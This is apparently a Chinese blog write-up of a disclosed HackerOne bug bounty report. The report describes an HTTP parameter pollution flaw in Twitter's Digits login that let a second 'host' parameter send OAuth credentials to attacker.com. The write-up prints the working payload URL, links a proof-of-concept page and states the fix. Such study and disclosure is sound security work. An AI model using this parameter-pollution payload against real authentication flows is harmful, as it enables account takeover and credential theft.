# 漏洞散记
##  用HTTP参数污染绕过认证(HPP)
> 虽然提交的厂商是Twitter，但个人感觉属于躺枪，因为这个BUG真正的发生的地方是digits.com
也就是一个专业做身份认证的产品，但是我后来去查了，发现这玩意就是Twitter发布的

> 漏洞价值:2520$

> 源漏洞:[#114169](https://hackerone.com/reports/114169)

# 漏洞详情
这次漏洞涉及到一个未开放的漏洞编号**[#108429](https://hackerone.com/reports/108429)**
但是由于没有公开出来，所以看不到详情，但是从作者说来看，应该是一个关于**digits.com**
的运行机制的漏洞

近来越来越多的网站都将身份认证独立开来，用另一套程序或者框架验证，然后再进行重定向。Twitter也是如此，认证方式交由**digits**，向其提供两个参数，分别是consumer_key and host，如果host注册过并且key被验证，那么将把票据重定向到host，否则被重定向到error

```
The former identifies which app a user wants to authenticate, and the latter specifies which domain the OAuth credential data is sent to after authentication，In order to prevent other websites to pretend to be the application, the host parameter will be validated to see if it matches the registered domain of the app
```
作者举了个例子：

```
https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE&host=https%3A%2F%2Fwww.periscope.tv
```

host=https://www.periscope.tv matches the registered domain

If we modify it:

    https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE&host=https%3A%2F%2Fattacker.com

host=https://attacker.com does not match the registered domain, thus the page will show an error.

正如上所示，这样应该是开发者理想中的合理验证

## 突破点

但是开发者并没有对于传输的参数做处理，导致了**[HPP](http://blog.csdn.net/eatmilkboy/article/details/6761407)**漏洞的存在，从而能够Bypass验证机制，被重定向到其余地址

作者提供了一个payload:

```
https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE&host=https%3A%2F%2Fwww.periscope.tv&host=https%3A%2F%2Fattacker.com

```
进入验证环节的是key与第一个host，这两个相互匹配，然而被认作为重定向指定域的却是第二个host
```
It affects every application that has integrated Digits, and even official application (Periscope). Attacker can abuse the flaw to login to victim's account on the affected applications.
```

作者自己写了一个POC,验证的目标是www.periscope.tv

### PoC
* Prepare a Periscope account which is associated with a phone number
* Login to Periscope using the phone number with digits web login flow: http://innerht.ml/pocs/digits-host-validation-bypass-hpp/
* After that your account will be renamed as "Pwn3d"(这儿个人觉得不是被改了名字，而是你用了他給的账号登录了)

当然，作者也提出了修复的方式



Make sure the validated host is the same as the one used as the transfer host, or return error if HPP detected

## 结语

上面提供了我认为比较好的一个HPP的文章，说实话第一次看到HPP的此种利用方式，学的还太少啊。整个漏洞挖掘的过程行云流水，与其说是一个挖掘过程，不如说是一个验证过程，并不存在什么特别之处，只能说是作者实打实的积累

但是如上身份验证方式越来越多，所以个人感觉需要加入到以后的测试流程中去
